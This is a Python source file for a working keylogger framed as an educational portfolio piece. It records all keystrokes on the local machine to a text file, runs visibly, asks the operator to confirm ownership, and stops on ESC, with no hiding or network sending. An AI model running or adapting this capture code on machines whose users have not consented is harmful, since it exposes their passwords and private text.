"""
=============================================================
  Ethical Keylogger Module
  Author : Mitesh Pravin Haldankar
  Purpose: Educational / Portfolio Demonstration ONLY
           Run ONLY on your own machine with explicit consent.
=============================================================
"""

import os
import sys
import time
import threading
import platform
from datetime import datetime
from pynput import keyboard

LOG_FILE = "keylog_output.txt"
SESSION_START = datetime.now()

class EthicalKeylogger:
    """
    Captures keystrokes on the local machine and writes them to a log file.
    Designed for ETHICAL, EDUCATIONAL use only — on your own system.
    """

    def __init__(self, log_file: str = LOG_FILE):
        self.log_file = log_file
        self.buffer = []
        self.lock = threading.Lock()
        self.running = False
        self.listener = None
        self.key_count = 0

        self._write_header()

    def _write_header(self):
        header = (
            f"\n{'='*60}\n"
            f"  ETHICAL KEYLOGGER — SESSION START\n"
            f"  Date/Time : {SESSION_START.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"  Platform  : {platform.system()} {platform.release()}\n"
            f"  User      : {os.getlogin()}\n"
            f"  NOTICE    : For educational & authorized use ONLY.\n"
            f"{'='*60}\n\n"
        )
        with open(self.log_file, "a") as f:
            f.write(header)

    def _format_key(self, key) -> str:
        try:
            return key.char  # printable character
        except AttributeError:
            # Special keys
            special = {
                keyboard.Key.space: " [SPACE] ",
                keyboard.Key.enter: "\n[ENTER]\n",
                keyboard.Key.backspace: "[BKSP]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT]",
                keyboard.Key.caps_lock: "[CAPS]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.delete: "[DEL]",
                keyboard.Key.up: "[↑]",
                keyboard.Key.down: "[↓]",
                keyboard.Key.left: "[←]",
                keyboard.Key.right: "[→]",
            }
            return special.get(key, f"[{key.name.upper()}]")

    def on_press(self, key):
        formatted = self._format_key(key)
        timestamp = datetime.now().strftime("%H:%M:%S")

        with self.lock:
            self.buffer.append(formatted)
            self.key_count += 1
            # Flush buffer every 20 keystrokes
            if len(self.buffer) >= 20:
                self._flush()

        # Stop on ESC for demo purposes
        if key == keyboard.Key.esc:
            self.stop()
            return False

    def _flush(self):
        """Write buffer to file."""
        if self.buffer:
            with open(self.log_file, "a") as f:
                f.write("".join(self.buffer))
            self.buffer.clear()

    def start(self):
        print(f"\n[*] Ethical Keylogger STARTED")
        print(f"[*] Logging to: {self.log_file}")
        print(f"[*] Press ESC to stop.\n")
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.listener.join()

    def stop(self):
        self.running = False
        with self.lock:
            self._flush()
        self._write_footer()
        print(f"\n[+] Keylogger STOPPED. Total keys captured: {self.key_count}")
        print(f"[+] Log saved to: {self.log_file}")

    def _write_footer(self):
        duration = datetime.now() - SESSION_START
        footer = (
            f"\n\n{'='*60}\n"
            f"  SESSION END\n"
            f"  Duration  : {str(duration).split('.')[0]}\n"
            f"  Total Keys: {self.key_count}\n"
            f"{'='*60}\n"
        )
        with open(self.log_file, "a") as f:
            f.write(footer)


if __name__ == "__main__":
    print("=" * 60)
    print("  ETHICAL KEYLOGGER — EDUCATIONAL USE ONLY")
    print("  Run ONLY on your OWN machine.")
    print("=" * 60)
    confirm = input("\n  Type 'AGREE' to confirm you own this machine: ")
    if confirm.strip().upper() != "AGREE":
        print("[!] Consent not given. Exiting.")
        sys.exit(0)

    logger = EthicalKeylogger()
    logger.start()
